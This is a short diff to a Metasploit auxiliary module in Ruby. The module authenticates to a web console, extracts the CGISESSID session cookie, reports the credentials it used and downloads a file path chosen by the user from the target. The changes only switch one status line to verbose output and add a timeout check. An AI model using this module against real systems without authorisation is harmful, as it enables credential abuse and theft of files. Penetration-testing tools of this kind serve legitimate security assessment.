@@ -74,7 +74,7 @@ class MetasploitModule < Msf::Auxiliary
     res_cookie = res.get_cookies
     if res.code == 302 && res_cookie.include?('CGISESSID')
       cgi_sid = res_cookie.scan(/CGISESSID=(\w+);/).flatten.first
-      print_status("CGI Session ID: #{cgi_sid}")
+      vprint_status("CGI Session ID: #{cgi_sid}")
       print_good("Authenticated as #{console_user}:#{console_pass}")
       report_cred(ip: ip, username: console_user, password: console_pass)
       return cgi_sid
@@ -155,7 +155,10 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     res = download_file(cgi_sid, datastore['FILEPATH'])
-    if remote_file_exists?(res)
+
+    if res.nil?
+      print_error("Connection timed out while downloading: #{datastore['FILEPATH']}")
+    elsif remote_file_exists?(res)
       save_file(res, ip)
     else
       print_error("Remote file not found: #{datastore['FILEPATH']}")
